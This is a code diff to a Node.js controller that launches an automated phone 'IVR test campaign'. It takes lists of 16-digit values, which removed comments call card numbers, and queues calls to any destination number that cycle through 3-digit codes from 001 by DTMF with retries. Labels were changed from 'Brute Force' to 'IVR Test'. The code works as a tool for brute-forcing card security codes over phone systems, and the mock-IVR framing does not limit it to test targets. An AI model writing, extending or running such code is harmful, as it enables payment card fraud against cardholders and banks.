@@ -52,38 +52,91 @@ export const getDashboardStatus = async (req, res) => {
 
 
 
-  // Start Single-Call Test code Brute Force Campaign
+  // Start IVR Test Campaign (Supports single or multiple 16-digit DTMF values)
   export const startTestCodeBruteForce = async (req, res) => {
-    const { phoneNumberId, sixteenDigit, toPhoneNumber, maxRetries } = req.body;
+    const { phoneNumberId, fromPhoneNumber, sixteenDigits, sixteenDigit, testValue, toPhoneNumber, destinationNumber, expectedTestCode, targetTestCode, testCode, maxRetries } = req.body;
     try {
-      const batchId = `Test code_${Date.now()}`;
-      
-      // Deterministically generate a target Test code based on the 16-digit card number
-      let hash = 0;
-      for (let i = 0; i < sixteenDigit.length; i++) {
-          hash = (hash * 31 + sixteenDigit.charCodeAt(i)) % 1000;
+      // 1. Extract array of 16-digit DTMF values
+      let valuesList = [];
+      const primaryValue = sixteenDigit || testValue;
+      if (Array.isArray(sixteenDigits)) {
+        valuesList = sixteenDigits.map(v => String(v).replace(/\D/g, '')).filter(v => v.length === 16);
+      } else if (typeof sixteenDigits === 'string' && sixteenDigits.trim()) {
+        valuesList = sixteenDigits.split(/[\n,\s]+/).map(v => v.replace(/\D/g, '')).filter(v => v.length === 16);
+      } else if (primaryValue) {
+        const val = String(primaryValue).replace(/\D/g, '');
+        if (val.length === 16) valuesList.push(val);
       }
-      // Ensure the hash is between 1 and 999
-      if (hash === 0) hash = 1; 
-      const randomTestCode = hash.toString().padStart(3, '0');
 
-      // Create ONLY ONE target attempt.
-      // We encode the starting Test code index in the test_value, e.g., '1234567812345678:001'
-      const targets = [{
-        phone_number: '+12495075171',
-        test_value: `${sixteenDigit}:001`,
-        target_test_code: randomTestCode
-      }];
+      if (valuesList.length === 0) {
+        return res.status(400).json({ error: 'At least one valid 16-digit DTMF value is required.' });
+      }
+
+      // Explicit target test code check
+      const explicitCode = expectedTestCode || targetTestCode || testCode;
+      const validExplicitCode = (explicitCode && /^\d{3}$/.test(String(explicitCode))) ? String(explicitCode) : null;
+
+      // Generate a common IVR test batch ID
+      const batchId = `IVR_TEST_${Date.now()}`;
       
-      // Note: Test IVR configures itself locally via JSON, so we don't push config to Supabase here.
+      const destPhone = destinationNumber || toPhoneNumber || '+12495075171';
+      const fromPhone = fromPhoneNumber || null;
+      let targetLineId = phoneNumberId;
+      if (fromPhone) {
+        try {
+          const lineObj = await PhoneLineModel.addPhoneLine(fromPhone);
+          if (lineObj && lineObj.id) {
+            targetLineId = lineObj.id;
+          }
+        } catch (e) {
+          console.log('[CampaignController] Auto-register line note:', e.message);
+        }
+      }
+
+      // Build target list with individual 16-digit values and 3-digit test codes
+      const targets = valuesList.map(digitVal => {
+        let code = validExplicitCode;
+        if (!code) {
+          // Generate secret 3-digit target code randomly (001-999)
+          const randomNum = Math.floor(Math.random() * 999) + 1;
+          code = randomNum.toString().padStart(3, '0');
+        }
+
+        return {
+          sixteen_digit: digitVal,
+          test_value: `${digitVal}:${code}`,
+          target_test_code: code,
+          current_test_code: '001',
+          phone_number: destPhone,
+          from_number: fromPhone
+        };
+      });
+
+      // Also sync Mock IVR config with current target test value & code
+      try {
+        const mockIvrUrl = process.env.MOCK_IVR_URL || 'http://localhost:5001';
+        await fetch(`${mockIvrUrl}/api/mock-ivr/config`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ sixteenDigit: targets[0].sixteen_digit, testCode: targets[0].target_test_code })
+        }).catch(() => {});
+      } catch (e) {}
 
       // Ensure no old/stuck queued attempts from previous runs get picked up
       await OrchestratorService.cancelPendingAttempts();
 
-      await AttemptModel.createAttemptBatch(targets, batchId);
-      OrchestratorService.startCampaign(phoneNumberId, maxRetries);
+      // Store multiple 16-digit values under the same IVR test batch
+      const createdAttempts = await AttemptModel.createAttemptBatch(targets, batchId);
+      
+      // Kicks off sequential attempt processing
+      OrchestratorService.startCampaign(targetLineId || phoneNumberId, maxRetries);
 
-      return res.status(200).json({ message: 'Single-Call Test code Brute Force Campaign started.', batchId, targetCount: targets.length });
+      return res.status(200).json({
+        message: `IVR Test Campaign started successfully with ${targets.length} attempt(s).`,
+        batchId,
+        targetCount: targets.length,
+        attempts: createdAttempts
+      });
     } catch (error) {
       console.error('Error starting Test code campaign:', error);
       return res.status(500).json({ error: error.message });
